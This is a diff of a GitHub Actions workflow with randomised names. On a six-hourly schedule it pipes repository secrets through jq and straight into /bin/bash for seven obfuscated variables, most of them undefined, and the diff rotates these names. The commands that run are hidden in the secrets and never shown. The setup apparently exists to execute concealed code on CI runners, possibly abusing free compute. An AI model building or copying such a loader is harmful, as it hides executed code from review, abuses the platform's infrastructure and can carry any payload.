@@ -1,10 +1,11 @@
 name: yutongshen7483
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
+    - cron: '39 0/6 * * *'
 
-jobs:  # 16937
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,12 +13,13 @@ jobs:  # 16937
       - uses: actions/checkout@v4
       - name: yutongshen7483
         env:
-          ovgh3: ${{ secrets.ovgh3 }}
+          ob801: ${{ secrets.ob801 }}
         run: |
-          echo $ovgh3 | jq -r .tmwik2124 | /bin/bash
-          echo $hhkoj42 | jq -r .vervx1 | /bin/bash
-          echo $wlqu13 | jq -r .wfq78074 | /bin/bash
-          echo $i18805 | jq -r .yzc6838 | /bin/bash
-          echo $bqhgb06051 | jq -r .oxlx7 | /bin/bash
-          echo $ujrh14 | jq -r .ag0338 | /bin/bash
+          echo $ob801 | jq -r .qryt410 | /bin/bash
+          echo $clw50 | jq -r .cdjec4 | /bin/bash
+          echo $jczj5 | jq -r .ftbtn51144 | /bin/bash
+          echo $lzce5538 | jq -r .pbe184 | /bin/bash
+          echo $ut6697 | jq -r .u326 | /bin/bash
+          echo $pm0 | jq -r .kvfnk8295 | /bin/bash
+          echo $lyxi7 | jq -r .d258 | /bin/bash
 
